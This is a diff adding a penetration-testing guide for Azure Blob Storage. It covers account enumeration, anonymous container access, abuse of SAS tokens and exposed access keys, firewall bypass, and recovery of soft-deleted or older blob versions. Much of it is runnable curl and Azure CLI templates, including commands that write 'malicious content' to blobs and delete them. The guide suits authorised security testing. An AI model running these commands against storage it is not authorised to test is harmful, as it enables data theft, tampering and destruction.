@@ -1,0 +1,474 @@
+<azure_blob_security_guide>
+<title>AZURE BLOB STORAGE SECURITY TESTING</title>
+
+<critical>Azure Blob Storage is Microsoft's object storage solution. Misconfigurations can lead to data exposure, unauthorized access, and data tampering. Testing must cover storage account enumeration, SAS token vulnerabilities, anonymous access, and container permissions.</critical>
+
+<scope>
+- Storage account enumeration
+- SAS (Shared Access Signature) token vulnerabilities
+- Anonymous access detection
+- Container and blob permissions
+- Access keys exposure
+- Azure AD authentication bypass
+- Network rules and firewall
+- Soft delete and versioning abuse
+</scope>
+
+<methodology>
+1. Enumerate storage accounts associated with the target.
+2. Test container and blob accessibility.
+3. Analyze SAS tokens for excessive permissions and expiration.
+4. Check anonymous access settings.
+5. Test Azure AD authentication if configured.
+</methodology>
+
+<storage_enumeration>
+<naming_patterns>
+{% raw %}
+# Azure storage account naming (3-24 chars, lowercase, alphanumeric):
+{company}storage
+{company}prod
+{company}dev
+{company}backup
+{company}data
+{company}assets
+{company}files
+{company}media
+{company}logs
+
+# Storage account URLs:
+https://{account}.blob.core.windows.net/
+https://{account}.dfs.core.windows.net/  # Data Lake Gen2
+https://{account}.file.core.windows.net/  # File shares
+https://{account}.queue.core.windows.net/ # Queues
+https://{account}.table.core.windows.net/ # Tables
+{% endraw %}
+</naming_patterns>
+
+<discovery_methods>
+{% raw %}
+# DNS-based enumeration:
+dig +short {account}.blob.core.windows.net
+nslookup {account}.blob.core.windows.net
+
+# Response indicates existence:
+# - IP address returned: exists
+# - NXDOMAIN: doesn't exist
+
+# Google dorks:
+site:blob.core.windows.net "company"
+site:*.blob.core.windows.net
+
+# Source code analysis:
+# Search for Azure storage URLs in:
+# - JavaScript files
+# - Configuration files
+# - Mobile apps
+
+# Certificate transparency:
+# Search for *.blob.core.windows.net
+{% endraw %}
+</discovery_methods>
+
+<container_enumeration>
+{% raw %}
+# List containers (if anonymous listing enabled):
+curl "https://{account}.blob.core.windows.net/?comp=list"
+
+# Common container names:
+$web          # Static website
+$logs         # Storage analytics logs
+$root         # Root container
+backups
+data
+uploads
+images
+assets
+public
+private
+files
+
+# Using Azure CLI:
+az storage container list --account-name {account}
+{% endraw %}
+</container_enumeration>
+</storage_enumeration>
+
+<access_testing>
+<anonymous_access>
+{% raw %}
+# Test anonymous read access:
+
+# List blobs in container:
+curl "https://{account}.blob.core.windows.net/{container}?restype=container&comp=list"
+
+# Read specific blob:
+curl "https://{account}.blob.core.windows.net/{container}/{blob}"
+
+# Test container access levels:
+# - Private: No anonymous access
+# - Blob: Anonymous read for blobs
+# - Container: Anonymous read for container and blobs
+
+# HEAD request for metadata:
+curl -I "https://{account}.blob.core.windows.net/{container}/{blob}"
+{% endraw %}
+</anonymous_access>
+
+<write_access>
+{% raw %}
+# Test anonymous write (rare but possible):
+
+# Upload blob:
+curl -X PUT \
+  -H "x-ms-blob-type: BlockBlob" \
+  -d "test content" \
+  "https://{account}.blob.core.windows.net/{container}/test.txt"
+
+# Test with SAS token:
+curl -X PUT \
+  -H "x-ms-blob-type: BlockBlob" \
+  -d "test content" \
+  "https://{account}.blob.core.windows.net/{container}/test.txt?{sas-token}"
+{% endraw %}
+</write_access>
+
+<azure_cli_testing>
+{% raw %}
+# Using Azure CLI:
+
+# List blobs anonymously:
+az storage blob list \
+  --account-name {account} \
+  --container-name {container} \
+  --auth-mode anonymous
+
+# Download blob:
+az storage blob download \
+  --account-name {account} \
+  --container-name {container} \
+  --name {blob} \
+  --file ./downloaded_file
+
+# Check public access setting:
+az storage container show \
+  --account-name {account} \
+  --name {container} \
+  --query publicAccess
+{% endraw %}
+</azure_cli_testing>
+</access_testing>
+
+<sas_token_attacks>
+<token_analysis>
+{% raw %}
+# SAS token structure:
+?sv=2021-06-08              # Storage version
+&ss=b                        # Services (b=blob)
+&srt=sco                     # Resource types
+&sp=rwdlacup                 # Permissions
+&se=2024-12-31T00:00:00Z     # Expiry
+&st=2024-01-01T00:00:00Z     # Start time
+&spr=https                   # Protocol
+&sig={signature}             # Signature
+
+# Permission flags:
+# r - Read
+# w - Write
+# d - Delete
+# l - List
+# a - Add
+# c - Create
+# u - Update
+# p - Process (Service SAS)
+
+# Analyze captured SAS tokens for:
+# - Long expiration (se parameter)
+# - Excessive permissions (sp parameter)
+# - HTTP allowed (spr=https,http)
+{% endraw %}
+</token_analysis>
+
+<token_exploitation>
+{% raw %}
+# Exploit overprivileged SAS tokens:
+
+# Token with write permission:
+curl -X PUT \
+  -H "x-ms-blob-type: BlockBlob" \
+  -d "malicious content" \
+  "https://{account}.blob.core.windows.net/{container}/file.txt?{sas}"
+
+# Token with delete permission:
+curl -X DELETE \
+  "https://{account}.blob.core.windows.net/{container}/{blob}?{sas}"
+
+# Token with list permission:
+curl "https://{account}.blob.core.windows.net/{container}?restype=container&comp=list&{sas}"
+
+# Enumerate all accessible blobs:
+az storage blob list \
+  --account-name {account} \
+  --container-name {container} \
+  --sas-token "{sas-without-question-mark}"
+{% endraw %}
+</token_exploitation>
+
+<token_reuse>
+{% raw %}
+# SAS token reuse attacks:
+
+# 1. Use account-level SAS across containers:
+# If token is account-level (not service-level)
+curl "https://{account}.blob.core.windows.net/other-container?{sas}"
+
+# 2. Use unexpired token after intended revocation:
+# SAS tokens can't be revoked individually
+# Only invalidated by:
+#   - Regenerating storage key
+#   - Expiration
+
+# 3. Token sharing:
+# Long-lived tokens can be shared externally
+{% endraw %}
+</token_reuse>
+</sas_token_attacks>
+
+<access_keys>
+<key_exposure>
+{% raw %}
+# Storage account access keys provide full control
+
+# Key patterns:
+# Base64 encoded, ~88 characters
+# Example: AbCdEf123456...==
+
+# Common exposure locations:
+# - Source code repositories
+# - Configuration files
+# - Connection strings
+# - Environment variables
+# - CI/CD pipelines
+
+# Connection string format:
+DefaultEndpointsProtocol=https;
+AccountName={account};
+AccountKey={key};
+EndpointSuffix=core.windows.net
+{% endraw %}
+</key_exposure>
+
+<key_usage>
+{% raw %}
+# Using exposed access key:
+
+# Generate SAS with key:
+az storage container generate-sas \
+  --account-name {account} \
+  --account-key {key} \
+  --name {container} \
+  --permissions rwdl \
+  --expiry 2025-01-01
+
+# List all containers:
+az storage container list \
+  --account-name {account} \
+  --account-key {key}
+
+# Full storage account access:
+az storage blob list --account-name {account} --account-key {key} --container-name {container}
+{% endraw %}
+</key_usage>
+</access_keys>
+
+<azure_ad_attacks>
+<rbac_testing>
+{% raw %}
+# Azure AD RBAC testing:
+
+# Check if Azure AD authentication is enabled:
+az storage account show \
+  --name {account} \
+  --query "allowBlobPublicAccess"
+
+# Test with Azure AD token:
+az storage blob list \
+  --account-name {account} \
+  --container-name {container} \
+  --auth-mode login
+
+# Required roles:
+# - Storage Blob Data Reader
+# - Storage Blob Data Contributor
+# - Storage Blob Data Owner
+{% endraw %}
+</rbac_testing>
+
+<token_attacks>
+{% raw %}
+# Azure AD token attacks:
+
+# Get access token:
+az account get-access-token --resource https://storage.azure.com/
+
+# Use token directly:
+curl -H "Authorization: Bearer {token}" \
+  "https://{account}.blob.core.windows.net/{container}?restype=container&comp=list"
+
+# Test with tokens from different identities:
+# Managed identity tokens
+# Service principal tokens
+{% endraw %}
+</token_attacks>
+</azure_ad_attacks>
+
+<network_rules>
+<firewall_testing>
+{% raw %}
+# Check storage account firewall:
+
+az storage account show \
+  --name {account} \
+  --query "networkRuleSet"
+
+# Bypass attempts:
+
+# 1. If trusted Microsoft services allowed:
+# Use Azure service to access storage
+
+# 2. IP allowlist bypass:
+# Test from allowed IP ranges
+# Check for overly broad allowlists
+
+# 3. VNet service endpoint bypass:
+# Access from within allowed VNet
+{% endraw %}
+</firewall_testing>
+</network_rules>
+
+<static_website>
+<website_attacks>
+{% raw %}
+# Azure static website hosting:
+
+# Website URL:
+https://{account}.z{region-code}.web.core.windows.net/
+
+# Container: $web
+# Public anonymous access required
+
+# Test for:
+# - Directory traversal
+# - Sensitive files
+# - Error page information disclosure
+
+# File enumeration:
+/.git/
+/config.json
+/.env
+/web.config
+{% endraw %}
+</website_attacks>
+</static_website>
+
+<versioning_softdelete>
+<soft_delete_abuse>
+{% raw %}
+# Soft delete recovery attacks:
+
+# If soft delete enabled, deleted blobs recoverable:
+az storage blob undelete \
+  --account-name {account} \
+  --container-name {container} \
+  --name {blob}
+
+# List deleted blobs:
+az storage blob list \
+  --account-name {account} \
+  --container-name {container} \
+  --include deleted
+
+# Recover sensitive data that was "deleted"
+{% endraw %}
+</soft_delete_abuse>
+
+<version_access>
+{% raw %}
+# Blob versioning attacks:
+
+# List versions:
+az storage blob list \
+  --account-name {account} \
+  --container-name {container} \
+  --include versions
+
+# Access specific version:
+curl "https://{account}.blob.core.windows.net/{container}/{blob}?versionId={version}"
+
+# Previous versions may contain:
+# - Sensitive data removed from current version
+# - Configuration before sanitization
+{% endraw %}
+</version_access>
+</versioning_softdelete>
+
+<common_payloads>
+{% raw %}
+# Container enumeration:
+curl "https://{account}.blob.core.windows.net/?comp=list"
+
+# Blob listing:
+curl "https://{account}.blob.core.windows.net/{container}?restype=container&comp=list"
+
+# Read blob:
+curl "https://{account}.blob.core.windows.net/{container}/{blob}"
+
+# Write test:
+curl -X PUT -H "x-ms-blob-type: BlockBlob" -d "test" "https://{account}.blob.core.windows.net/{container}/test.txt"
+
+# SAS token analysis patterns:
+sp=rwdl  # Excessive permissions
+se=2099-12-31  # Long expiration
+{% endraw %}
+</common_payloads>
+
+<validation>
+1. Demonstrate storage account enumeration with discovered accounts.
+2. Show anonymous read access with downloaded content.
+3. Prove SAS token vulnerability with exploitation.
+4. Document exposed sensitive data.
+5. Provide Azure CLI commands and curl requests for reproduction.
+</validation>
+
+<false_positives>
+- Intentionally public containers for static content
+- Short-lived SAS tokens for legitimate access
+- Storage firewall blocking external access
+- Azure AD authentication properly enforced
+- Private endpoints with no public access
+</false_positives>
+
+<impact>
+- Data breach via publicly accessible sensitive data
+- Data tampering via write access
+- Website defacement through blob replacement
+- Credential exposure via key leakage
+- Compliance violations (GDPR, HIPAA)
+- Supply chain attacks via modified artifacts
+</impact>
+
+<pro_tips>
+1. Enumerate storage accounts using company naming patterns.
+2. Capture and analyze SAS tokens from application traffic.
+3. Check both container and blob-level access.
+4. Test with Azure CLI for comprehensive enumeration.
+5. Look for storage URLs in JavaScript and mobile apps.
+6. Check connection strings for embedded access keys.
+7. Test soft delete for previously deleted sensitive data.
+8. Verify blob versioning for historical sensitive content.
+9. Check $web container for static website content.
+10. Test from different networks for firewall bypass.
+</pro_tips>
+
+<remember>Azure Blob Storage security involves multiple layers: storage account firewall, container public access level, SAS tokens, Azure AD RBAC, and access keys. A storage account may be secure at one layer but exposed at another. Always test anonymous access, SAS token permissions, and Azure AD authentication to understand the complete access picture.</remember>
+</azure_blob_security_guide>
